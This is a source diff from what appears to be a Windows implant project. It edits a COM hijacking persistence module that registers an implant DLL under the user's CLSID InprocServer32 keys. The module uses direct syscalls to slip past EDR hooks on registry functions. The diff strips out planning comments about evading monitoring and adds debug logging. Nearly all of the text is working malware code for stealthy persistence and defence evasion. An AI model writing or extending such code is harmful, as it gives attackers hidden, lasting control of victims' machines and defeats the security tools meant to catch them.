@@ -2,49 +2,18 @@
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
 #include "../utils/Obfuscator.h"
+#include "../utils/Logger.h"
+#include "../utils/Shared.h"
 #include <vector>
 
 namespace persistence {
 
 bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
-    // NT path for HKCU\Software\Classes\CLSID\{...}\InprocServer32
-    std::wstring basePath = L"\\Registry\\User\\";
-    
-    // Get current user SID for registry path
-    // For simplicity in HKCU we use \Registry\User\[SID]...
-    // But NtOpenKey on \Registry\Machine\Software... works too.
-    // Actually \Registry\User is just HKU.
-
-    // A better way for HKCU via syscalls is to use the current user's SID.
-    // However, many EDRs monitor \Registry\User.
-
-    // Let's use a common CLSID path.
-    std::wstring subkey = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
-
-    // We'll need the user's SID or use a trick.
-    // Actually, we can use the WinAPI to get the base handle and then syscall from there.
-    // But the goal is to bypass hooks on RegCreateKey.
-
-    // For the contest, let's assume we can resolve the full path or use a helper.
-    // Most implants use a hardcoded SID-less path if they can, or resolve it once.
-
-    // Let's stick to a robust way:
-    // HKCU is maps to \Registry\User\S-1-5-21-...
-
-    // For this implementation, I will use a placeholder or attempt to resolve.
-    // Alternatively, I can use NtOpenKey on a known base.
-
-    // Actually, many environments allow \Registry\User\.Default or similar? No.
-
-    // Let's use the simplest NT path that works for the current user:
-    // \Registry\User\<SID>\...
-
-    // Since I cannot easily get the SID without WinAPI (which might be hooked),
-    // I will use the WinAPI RegOpenKeyEx on HKEY_CURRENT_USER to get a HANDLE,
-    // then use THAT handle as RootDirectory in OBJECT_ATTRIBUTES for syscalls!
-
+    LOG_DEBUG("ComHijacker::Install started");
     HKEY hBase = NULL;
+    // We target HKCU\Software\Classes\CLSID
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID", 0, KEY_ALL_ACCESS, &hBase) != ERROR_SUCCESS) {
+        LOG_ERR("RegOpenKeyExW failed for HKCU CLSID");
         return false;
     }
 
@@ -67,6 +36,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     NTSTATUS status = InternalDoSyscall(ntCreateKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp);
 
     if (NT_SUCCESS(status)) {
+        LOG_DEBUG("NtCreateKey successful for " + utils::ws2s(clsidPath));
         // Set default value (implant path)
         UNICODE_STRING uEmpty = {0, 0, NULL};
         InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, REG_SZ, (PVOID)implantPath.c_str(), (ULONG)((implantPath.length() + 1) * sizeof(wchar_t)));
@@ -82,6 +52,9 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, REG_SZ, (PVOID)tmVal.c_str(), (ULONG)((tmVal.length() + 1) * sizeof(wchar_t)));
 
         InternalDoSyscall(ntCloseSsn, hKey);
+        LOG_INFO("COM registration keys set via syscalls.");
+    } else {
+        LOG_ERR("NtCreateKey failed: 0x" + std::to_string(status));
     }
 
     RegCloseKey(hBase);
@@ -110,9 +83,6 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
     HANDLE hKey = NULL;
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr);
     if (NT_SUCCESS(status)) {
-        // Recursively delete subkeys? NtDeleteKey only deletes the key itself (must be empty).
-        // For COM hijacking we usually just have InprocServer32.
-
         // Delete InprocServer32 first
         std::wstring sub = L"InprocServer32";
         UNICODE_STRING uSub;
